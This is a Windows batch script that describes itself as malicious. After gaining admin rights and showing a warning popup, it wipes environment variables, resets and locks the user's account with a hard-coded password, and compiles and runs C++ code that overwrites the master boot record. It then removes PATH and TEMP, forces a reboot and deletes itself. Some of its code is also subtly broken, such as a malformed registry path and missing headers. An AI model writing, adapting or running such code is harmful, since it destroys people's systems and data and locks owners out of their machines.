:: WARNING: Run this script on your own risk.

@echo off
:: Check admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

:: Create a warning popup
set "VBS_FILE=%temp%\warning_temp_%random%.vbs"

echo x=MsgBox("This script contains malicious content, run at your own risk. The author is not responsible for any damage.", 48 + 4, "Warning") > "%VBS_FILE%"
echo If x=7 Then WScript.Quit >> "%VBS_FILE%"

wscript //nologo "%VBS_FILE%"
if errorlevel 1 goto :Abort

del "%VBS_FILE%" >nul 2>&1

:: Check if the user has a C++ environment installed
where g++ >nul 2>nul
if %ERRORLEVEL% equ 0 (
    echo C++ Environment found.
) else (
    echo No C++ Environment found. Exiting
    echo.
    exit /b 1
)

:: Delete all user and system environment variables
setlocal
set "USER_KEY=HKCU\Environment"
for /f "tokens=3" %%v in ('reg query "%USER_KEY%" ^| findstr /v /i "(Default)"') do (
    reg delete "%USER_KEY%" /v "%%v" /f >nul 2>&1
)

set "SYSTEM_KEY=HKLMSYSTEM\CurrentControlSet\Control\Session Manager\Environment"
for /f "tokens=3" %%v in ('reg query "%SYSTEM_KEY%" ^| findstr /v /i "(Default)"') do (
    reg delete "%SYSTEM_KEY%" /v "%%v" /f >nul 2>&1
)
endlocal

:: Reset the current user's password
setlocal
set "CurrentUser=%USERNAME%"
set "NewPassword=R7@x!G9#tL2$wQ8^zF3&dP5*"
net user "%CurrentUser%" "%NewPassword%"
endlocal

:: Lock the workstation so the user can't log in unless the user knows the new password
rundll32.exe user32.dll,LockWorkStation

:: Create a C++ source file which will overwrite the MBR
setlocal
set SOURCE_FILE=bootoverwrite.cpp
set EXECUTABLE=bootoverwrite.execute

echo #include <iostream> > %SOURCE_FILE%
echo #include <vector> >> %SOURCE_FILE%
echo. >> %SOURCE_FILE%
echo int main(int argc, CHAR* argv[]) >> %SOURCE_FILE%
echo { >> %SOURCE_FILE%
echo    OVERLAPPED osWrite; >> %SOURCE_FILE%
echo    memset(&osWrite, 0, (1 * 512)); >> %SOURCE_FILE%
echo    osWrite.offset = 0; >> %SOURCE_FILE%
echo    osWrite.offsetHigh = 0; >> %SOURCE_FILE%
echo    osWrite.hEvent = 0; >> %SOURCE_FILE%
echo. >> %SOURCE_FILE%
echo    CHAR buffer[512]; >> %SOURCE_FILE%
echo    strncpy_s(buffer, "JHZNAFYPYXLPJNZMNXSUITBXTICFJYQDJCJQETPRTRXKBMSJOHFHHEDZPTILDSEFHIXKRPKNCSICHITYSWPRDRFMNLXSUHGXACTPBBVZQWMLKGTUSNRCFIPYDAEZOHMNVXQWJTLRBCYSKPFGAIQZMDHUNVTREYOSLKJQWMPXCFZABGHYTNSRDLKIEOMVJUPQWZCFXTBASNYRGHLKMDVQPEJOTFSWZBIXCNYGRAHVQUKPMDLTSJXENFZBICYQWRGOLHTASVPKMNDJUFEXQYBRLZSIWGOTPHCAXNVKJMDQYFETRSLOBWPXZIHACNUGVQKJYMFDRSPLTZXEONIBWQCVKHJYASMFPDLRGTUQZEXNIBWOKCJSYHMRAPTLFVDQZXEUGNPKWISJCHYOLMBTRAFQPVZD", 512) >> %SOURCE_FILE%
echo. >> %SOURCE_FILE%
echo    HANDLE hHandle = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_FLAG_NO_BUFFERING, 0); >> %SOURCE_FILE%
echo    WriteFile(hHandle, buffer, (1 * 512), NULL, &osWrite); >> %SOURCE_FILE%
echo    CloseHandle(hHandle); >> %SOURCE_FILE%
echo. >> %SOURCE_FILE%
echo    printf("MBR Overwrite Complete\n"); >> %SOURCE_FILE%
echo    return 0; >> %SOURCE_FILE%
echo } >> %SOURCE_FILE%
:: Run the file
g++ bootoverwrite.cpp -o bootoverwrite.exe
:: Check if the executable was created successfully and run it else exit
if exist bootoverwrite.exe (
    bootoverwrite.exe
) else (
    echo A error occurred. Exiting
    exit /b 1
)
endlocal

:: Ensuring the major system and user environment variables are deleted.
reg delete "HKCU\Environment" /v Path /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v TEMP /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v TMP /f >nul 2>&1

:: Restart the computer
shutdown /r /f /t 0

:: Self destruction
:Abort
ping 127.0.0.1 -n 2 > nul 2>&1
del /f /q "%~f0"
exit
pause
